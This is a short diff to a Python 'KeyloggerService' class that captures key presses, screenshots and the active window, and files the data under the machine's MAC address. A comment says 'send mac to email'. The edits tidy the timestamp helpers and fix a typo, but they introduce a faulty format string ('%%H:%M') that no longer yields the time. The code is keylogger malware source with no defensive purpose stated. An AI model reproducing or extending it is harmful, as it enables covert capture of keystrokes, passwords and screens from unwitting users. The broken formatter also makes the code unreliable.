@@ -5,6 +5,8 @@ import pygetwindow
 from getmac import get_mac_address
 from PIL import ImageGrab
 
+
+
 class KeyloggerService:
     # send mac to email
     def __init__(self, if_screenshot=True):
@@ -40,8 +42,12 @@ class KeyloggerService:
         self.__action = not self.__action
 
     @staticmethod
+    def __current_date() -> str:
+        return time.strftime('%d/%m/%Y')
+
+    @staticmethod
     def __current_time() -> str:
-        return time.strftime('%d/%m/%Y  %H:%M')
+        return time.strftime('%%H:%M')
 
     def __on_press(self, pressed_key):
         key = pressed_key.name
@@ -49,7 +55,7 @@ class KeyloggerService:
 
 
     def __add_on_release(self, pressed_key):
-        return pressed_key.namegit
+        return pressed_key.name
 
     def _take_shot(self):
         if self.__if_screenshot:
@@ -66,6 +72,7 @@ class KeyloggerService:
 
     def __add_to_data(self, dictionary: dict, data: str):
         self.__update_current_window()
+        current_date = self.__current_date()
         current_time = self.__current_time()
         mac = get_mac_address()
         if not dictionary.get(mac):
